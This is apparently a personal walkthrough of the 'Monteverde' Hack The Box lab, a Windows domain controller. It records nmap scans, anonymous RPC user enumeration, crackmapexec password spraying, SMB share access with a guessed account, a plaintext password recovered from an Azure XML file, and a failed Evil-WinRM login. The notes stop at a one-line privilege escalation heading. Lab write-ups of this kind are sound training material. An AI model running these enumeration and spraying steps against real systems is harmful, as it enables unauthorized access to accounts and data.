# monteverde

─$ sudo nmap 10.129.58.93
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-17 19:50 EDT
Nmap scan report for 10.129.58.93
Host is up (0.24s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.172

└─$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -Pn 10.129.58.93
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-17 19:56 EDT
Nmap scan report for 10.129.58.93
Host is up (0.32s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-17 23:56:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-17T23:56:39
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.39 seconds

# smb enumeration 

failed

──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N -L //10.129.58.93
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.58.93 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                      
┌──(kali㉿kali)-[~/Downloads]
└─$ ping 10.129.58.93 
PING 10.129.58.93 (10.129.58.93) 56(84) bytes of data.
64 bytes from 10.129.58.93: icmp_seq=1 ttl=127 time=236 ms
64 bytes from 10.129.58.93: icmp_seq=2 ttl=127 time=181 ms
^C
--- 10.129.58.93 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 181.053/208.385/235.717/27.332 ms
                                                                                                                      
┌──(kali㉿kali)-[~/Downloads]
└─$ smbmap -H 10.129.58.93        
[+] IP: 10.129.58.93:445	Name: 10.129.58.93                                      
                                                                                                                      
┌──(kali㉿kali)-[~/Downloads]
└─$ smbmap -H 10.129.58.93 -i 0xdf
usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME] [-p PASSWORD] [-s SHARE] [-d DOMAIN] [-P PORT] [-v]
              [--admin] [-x COMMAND] [--mode CMDMODE] [-L | -R [PATH] | -r [PATH]] [-A PATTERN | -g] [--dir-only]
              [--no-write-check] [-q] [--depth DEPTH] [--exclude SHARE [SHARE ...]] [-F PATTERN]
              [--search-path PATH] [--search-timeout TIMEOUT] [--download PATH] [--upload SRC DST]
              [--delete PATH TO FILE] [--skip]
smbmap: error: unrecognized arguments: -i 0xdf
                                                                                                                      
┌──(kali㉿kali)-[~/Downloads]
└─$ smbmap -H 10.129.58.93 -u 0xdf
[!] Authentication error on 10.129.58.93


# rpc enumeration

┌──(kali㉿kali)-[~/Downloads]
└─$ rpcclient -U "" -N 10.129.58.93
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)

# crackmapexec password spraying

└─$ crackmapexec smb 10.129.58.93 -u users -p users --continue-on-success
SMB         10.129.58.93    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.58.93    445    MONTEVERDE       [-] MEGABANK.LOCAL\users:users STATUS_LOGON_FAILURE 


he enumerated all users with same username as passwords

# smbmap with credentials

┌──(kali㉿kali)-[~/Downloads]
└─$ smbmap -H 10.129.58.93 -u SABatchJobs -p SABatchJobs
[+] IP: 10.129.58.93:445	Name: 10.129.58.93                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY	
                                                                        
The term SYSVOL refers to a set of files and folders that reside on the local hard disk of each domain controller in a domain and that are replicated by the File Replication service (FRS). Network clients access the contents of the SYSVOL tree by using the following shared folders: NETLOGON. SYSVOL.


azure xml contains a password inside user$

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>

# evil WINRM not working

┌──(root㉿kali)-[/home/kali/Downloads]
└─# ruby ./evil-winrm-3.4/evil-winrm.rb -i 10.129.58.93 -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type OpenSSL::Digest::DigestError happened, message is Digest initialization failed: initialization error

Error: Exiting with code 1


# privesc

in order to get administrator we pull configuration file of the user for replication which is accessible to the naive user




